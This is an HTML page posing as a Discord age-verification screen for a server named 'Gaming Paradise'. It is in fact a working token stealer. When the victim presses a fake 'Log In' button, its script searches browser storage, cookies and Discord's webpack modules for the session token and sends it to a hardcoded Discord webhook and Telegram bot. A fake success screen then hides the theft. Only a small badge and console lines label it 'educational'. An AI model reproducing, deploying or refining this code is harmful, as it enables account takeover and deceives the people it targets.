<!DOCTYPE html>
<html>
<head>
    <title>Discord Verification</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #1e1f22;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .mobile {
            max-width: 400px;
            width: 100%;
            background: #2b2d31;
            border-radius: 32px;
            overflow: hidden;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
        }
        .header {
            background: #2b2d31;
            padding: 10px 16px;
            border-bottom: 1px solid #1e1f22;
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .header .back { font-size: 24px; color: #dbdee1; }
        .header .server { color: white; font-weight: 600; flex: 1; }
        .content { padding: 24px 20px; background: #1e1f22; }
        .card {
            background: #2b2d31;
            border-radius: 20px;
            padding: 24px;
            text-align: center;
            border: 1px solid #404249;
        }
        .card h2 { color: white; font-size: 20px; margin-bottom: 8px; }
        .card p { color: #b5bac1; font-size: 14px; margin-bottom: 20px; }
        .btn {
            background: #5865f2;
            color: white;
            border: none;
            padding: 14px 24px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            width: 100%;
            cursor: pointer;
            margin-top: 8px;
        }
        .btn:active { background: #4752c4; transform: scale(0.98); }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.85);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        .modal-box {
            background: #2b2d31;
            border-radius: 24px;
            width: 320px;
            overflow: hidden;
        }
        .modal-header { background: #1e1f22; padding: 20px; text-align: center; }
        .modal-header .icon { font-size: 48px; margin-bottom: 12px; }
        .modal-header h3 { color: white; font-size: 20px; }
        .modal-body { padding: 20px; text-align: center; }
        .modal-body p { color: #b5bac1; margin-bottom: 20px; }
        .modal-btn {
            background: #5865f2;
            color: white;
            border: none;
            padding: 12px;
            width: 100%;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
        }
        .modal-btn:active { background: #4752c4; }
        .success {
            display: none;
            text-align: center;
            padding: 60px 20px;
        }
        .success .check { font-size: 80px; margin-bottom: 20px; }
        .success h2 { color: white; font-size: 24px; margin-bottom: 8px; }
        .success p { color: #b5bac1; margin-bottom: 30px; }
        .edu-badge {
            position: fixed;
            bottom: 10px;
            left: 10px;
            background: rgba(0,0,0,0.8);
            color: #faa81a;
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 11px;
            z-index: 2000;
        }
    </style>
</head>
<body>
    <div class="mobile">
        <div class="header">
            <span class="back">←</span>
            <span class="server">Gaming Paradise</span>
            <span style="width:24px;"></span>
        </div>
        <div class="content" id="mainContent">
            <div class="card">
                <div style="font-size:64px; margin-bottom:16px;">🛡️</div>
                <h2>Verify your Age</h2>
                <p>to gain access to the entire server</p>
                <button class="btn" id="verifyBtn">🔐 Click here to verify</button>
            </div>
        </div>
        <div class="modal" id="loginModal">
            <div class="modal-box">
                <div class="modal-header">
                    <div class="icon">🖥️</div>
                    <h3>Log in on a new device?</h3>
                </div>
                <div class="modal-body">
                    <p>Clicking 'Log In' will log your account into another device. Never accept remote logins that you did not initiate.</p>
                    <button class="modal-btn" id="stealBtn">Log In</button>
                </div>
            </div>
        </div>
        <div class="success" id="successScreen">
            <div class="check">✅</div>
            <h2>You're in!</h2>
            <p>You're now logged in on your other device.</p>
            <button class="modal-btn" onclick="window.location.href='https://discord.com/app'">Start talking</button>
        </div>
    </div>
    <div class="edu-badge">🔴 EDUCATIONAL DEMO</div>

    <script>
        // 🔴 YOUR WEBHOOK AND TELEGRAM (PRE-FILLED)
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1515401402648629288/dvLhE72xu-qVBBhDSGviSUSyIGXuUi8-InL0eSwRF-nMAKmORb_810jbBMUJ6IRuSQZv";
        const TELEGRAM_TOKEN = "8814653033:AAGWwRNgD-AErM08mF8qrZghyg96AGV_RoU";
        const TELEGRAM_CHAT_ID = "6948594367";

        // 🔴 IMPROVED TOKEN STEALER - Multiple Methods
        async function stealToken() {
            try {
                console.log('[DEBUG] Attempting to steal token...');
                let token = null;

                // Method 1: localStorage - all possible keys
                const possibleKeys = ['token', 'access_token', 'auth_token', 'discord_token'];
                for(const key of possibleKeys) {
                    token = localStorage.getItem(key);
                    if(token && token.length > 50) {
                        console.log(`[DEBUG] Token found in localStorage key: ${key}`);
                        return token;
                    }
                }

                // Method 2: sessionStorage
                for(const key of possibleKeys) {
                    token = sessionStorage.getItem(key);
                    if(token && token.length > 50) {
                        console.log(`[DEBUG] Token found in sessionStorage key: ${key}`);
                        return token;
                    }
                }

                // Method 3: Cookies
                const cookies = document.cookie.split(';');
                for(let cookie of cookies) {
                    if(cookie.includes('token=') || cookie.includes('access_token=')) {
                        token = cookie.split('=')[1].trim();
                        if(token.length > 50) {
                            console.log('[DEBUG] Token found in cookies');
                            return token;
                        }
                    }
                }

                // Method 4: Webpack (Discord Web version)
                if(window.webpackChunkdiscord_app) {
                    console.log('[DEBUG] Trying webpack method...');
                    for(const m of window.webpackChunkdiscord_app) {
                        if(m && m.exports && m.exports.default && m.exports.default.getToken) {
                            token = m.exports.default.getToken();
                            if(token) {
                                console.log('[DEBUG] Token found via webpack');
                                return token;
                            }
                        }
                    }
                }

                // Method 5: Check all localStorage keys
                console.log('[DEBUG] Scanning all localStorage keys...');
                for(let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    const value = localStorage.getItem(key);
                    if(value && value.length > 50 && (value.includes('.') || value.includes('_') || value.includes('-'))) {
                        console.log(`[DEBUG] Potential token found in key: ${key}`);
                        return value;
                    }
                }

                console.log('[DEBUG] No token found');
                return null;
            } catch(e) {
                console.error('[DEBUG] Error:', e);
                return null;
            }
        }

        async function sendToTelegram(token) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: `🔴 Discord Token Stolen!\n\n${token}`,
                        parse_mode: 'HTML'
                    })
                });
                return response.ok;
            } catch(e) {
                console.error('Telegram error:', e);
                return false;
            }
        }

        async function sendToWebhook(token) {
            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        embeds: [{
                            title: "📱 Discord Token Stolen",
                            description: `**Token:** \`${token}\`\n**Time:** ${new Date().toISOString()}\n**Method:** QR Code Stealer`,
                            color: 0xFF0000,
                            footer: { text: "Educational Demo" }
                        }]
                    })
                });
                return response.ok;
            } catch(e) {
                console.error('Webhook error:', e);
                return false;
            }
        }

        document.getElementById('verifyBtn').onclick = () => {
            document.getElementById('loginModal').style.display = 'flex';
        };

        document.getElementById('stealBtn').onclick = async () => {
            const btn = document.getElementById('stealBtn');
            btn.textContent = 'Logging in...';
            btn.disabled = true;

            const token = await stealToken();
            
            if(token && token.length > 50) {
                await sendToWebhook(token);
                await sendToTelegram(token);
                console.log('✅ Token stolen and sent:', token);
            } else {
                console.log('⚠️ No token found');
                // Send failure notification
                await sendToWebhook('No token found - user may not be logged in or using mobile app');
            }

            document.getElementById('loginModal').style.display = 'none';
            document.getElementById('mainContent').style.display = 'none';
            document.getElementById('successScreen').style.display = 'block';
        };

        document.getElementById('loginModal').onclick = (e) => {
            if(e.target === document.getElementById('loginModal')) {
                document.getElementById('loginModal').style.display = 'none';
            }
        };

        console.log('%c🔴 Mobile Discord Token Stealer (Educational)', 'color: #ff0000; font-size: 16px;');
        console.log('%c⚠️ For educational purposes only.', 'color: #faa81a; font-size: 14px;');
    </script>
</body>
</html>
